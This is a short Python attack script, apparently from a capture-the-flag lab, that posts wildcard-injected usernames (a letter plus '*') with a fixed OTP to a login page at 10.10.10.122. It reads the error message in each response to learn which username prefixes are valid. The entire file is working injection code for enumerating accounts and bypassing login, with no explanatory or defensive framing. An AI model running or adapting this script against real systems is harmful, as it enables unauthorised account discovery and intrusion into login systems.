#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 inject.py

import re
from string import ascii_lowercase
from urllib.parse import quote_plus

import requests

URL = 'http://10.10.10.122/login.php'

for c in ascii_lowercase:
	inject = c + quote_plus('*')

	data = {
		'inputUsername': inject,
		'inputOTP': '31337'
	}

	resp = requests.post(URL, data=data)
	match = re.search(r'<div class="col-sm-10">(.*?)</div>', resp.text, re.DOTALL)
	print(f'{c}* => {match.group(1).strip() == "Cannot login"}')
